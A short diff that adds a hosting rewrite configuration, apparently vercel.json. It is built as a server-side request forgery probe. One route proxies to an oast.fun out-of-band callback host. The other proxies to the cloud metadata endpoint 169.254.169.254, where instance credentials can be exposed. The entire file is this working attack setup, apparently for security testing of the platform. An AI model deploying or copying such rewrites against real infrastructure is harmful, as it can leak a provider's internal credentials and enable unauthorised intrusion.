@@ -1,0 +1,12 @@
+{
+  "rewrites": [
+    {
+      "source": "/ssrf-oob",
+      "destination": "http://vercel-ssrf-test.rccfgkxjzxqnwrexlhabvhw3ew2wq9fbg.oast.fun/"
+    },
+    {
+      "source": "/ssrf-metadata",
+      "destination": "http://169.254.169.254/latest/meta-data/"
+    }
+  ]
+}
